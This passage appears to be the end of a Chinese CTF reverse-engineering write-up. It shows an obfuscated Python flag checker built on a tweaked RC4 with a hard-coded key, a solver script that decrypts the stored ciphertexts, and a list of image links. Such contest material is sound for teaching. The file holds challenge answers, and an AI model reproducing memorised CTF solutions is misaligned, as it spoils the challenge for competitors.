assert d(L)%2==0,'flag length should be even'
t=b'v3ry_s3cr3t_p@ssw0rd'
O=E(L,2)
U=[]
for i in O:
U.append(N(t,i).hex())

if U==['1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60','2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a']:
Y('Congratulations! You got the flag!')
else:
print('Wrong flag!')
a = True
d = len
G = list
g = range
s = next
R = bytes
Y = print

# 生成器 l(S)（与加密时的相同）
def l(S):
i = 0
j = 0
while True:
i = (i + 1) % 256
j = (j + S[i]) % 256
S[i], S[j] = S[j], S[i]
K = S[(S[i] + S[j]) % 256]
yield K

# RC4 解密函数 N
def N(key, O):
I = d(key)
S = G(g(256))
j = 0
for i in g(256):
j = (j + S[i] + key[i % I]) % 256
S[i], S[j] = S[j], S[i]

z = l(S) # 初始化生成器
n = []
for k in O:
n.append(k ^ s(z) + 2) # 用生成器返回的伪随机数解密数据
return R(n) # 返回解密后的字节对象

# 字符串分割函数 E（与加密时的相同）
def E(s, parts_num):
Q = d(s.decode()) # 获取字符串的长度
S = Q // parts_num # 每个部分的大小
u = Q % parts_num # 余数，决定最后一部分的大小
W = []
j = 0
for i in g(parts_num):
T = j + S
if u &gt; 0:
T += 1 # 增加最后部分的大小
u -= 1
W.append(s[j:T])
j = T
return W # 返回分割后的字符串块

# 解密函数
def decrypt_flag(U):
t = b'v3ry_s3cr3t_p@ssw0rd' # 固定密钥
decrypted_parts = []

for part in U:
# 解密每个部分
encrypted_bytes = bytes.fromhex(part) # 将十六进制字符串转换为字节
decrypted_part = N(t, encrypted_bytes) # 使用 RC4 解密
decrypted_parts.append(decrypted_part.decode()) # 将字节解码为字符串

# 将解密后的两部分合并
return ''.join(decrypted_parts)

# 主程序入口
if __name__ == '__main__':
# 给定加密后的结果
U = [
'1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60',
'2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a'
]

# 解密 flag
flag = decrypt_flag(U)

print("Decrypted flag:", flag)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1731371059.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1731371060.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1731371060.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1731371061.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1731371063.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1731371065.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1731371065.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731371066.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731371066.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1731371067.png)